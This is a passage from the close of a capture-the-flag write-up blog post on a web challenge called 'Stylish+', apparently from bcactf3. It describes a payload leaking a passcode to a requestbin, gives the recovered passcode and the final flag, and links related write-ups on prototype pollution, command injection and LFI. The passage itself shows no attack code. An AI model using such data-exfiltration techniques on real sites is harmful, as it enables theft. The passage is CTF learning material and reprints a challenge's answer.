</span></pre></table></code></div></div><p>So let’s just send it and find out if it works</p><h2 id="flag">Flag</h2><p>And it does work, I am receiving multiple requests in my requestbin.</p><p>I had to repeat this process for a few times until I had the working passcode because of some latency issue but in the end I had the working passcode: 4D7EA2950FC8B613</p><p>Sending it to the <code class="language-plaintext highlighter-rouge">api/flag</code> endpoint reveals the flag.</p><blockquote><p>bcactf{insert_absolutely_bad_css_pun_here_1fAZUo7ZgiCqiQkBkwPW0A}</p></blockquote><p>٩(◕‿◕｡)۶</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/web/'>web</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/bcactf3/" class="post-tag no-text-decoration" >bcactf3</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Stylish+ - ox7f&url=/posts/stylish+/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Stylish+ - ox7f&u=/posts/stylish+/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/stylish+/">Stylish+</a><li><a href="/posts/knife/">Knife</a><li><a href="/posts/armageddon/">Armageddon</a><li><a href="/posts/caas/">Caas</a><li><a href="/posts/pcalc/">Pcalc</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/cyberapocalpyse2021/">cyberapocalpyse2021</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/bcactf3/">bcactf3</a></div></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/blitzProp/"><div class="card-body"> <span class="timeago small" > Apr 25, 2021 <i class="unloaded">2021-04-25T10:13:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>BlitzProb</h3><div class="text-muted small"><p> This challenge contains a Prototype Pollution to RCE via AST Injection. You can read more about it in this great blog post. (* ^ ω ^) Upon visiting the entry point, we are greeted with a aesthetic...</p></div></div></a></div><div class="card"> <a href="/posts/caas/"><div class="card-body"> <span class="timeago small" > Apr 25, 2021 <i class="unloaded">2021-04-25T12:52:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Caas</h3><div class="text-muted small"><p> Looking at the name of the challenge, we can assume it has something to do with curl. Which could be vulnerable to command injection. However, let’s check the source code before making any assumpti...</p></div></div></a></div><div class="card"> <a href="/posts/miniSTRyplace/"><div class="card-body"> <span class="timeago small" > Apr 25, 2021 <i class="unloaded">2021-04-25T14:03:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>MiniSTRyplace</h3><div class="text-muted small"><p> This challenge contains a LFI vulnerability. You can read more about it in this article. (* ^ ω ^) The webpage looks like this: Vulnerability Let’s take a look at the index file index.php: &lt;ht...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/knife/" class="btn btn-outline-primary" prompt="Older"><p>Knife</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/ox7f2">127</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">stayin' alive.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/cyberapocalpyse2021/">cyberapocalpyse2021</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/bcactf3/">bcactf3</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
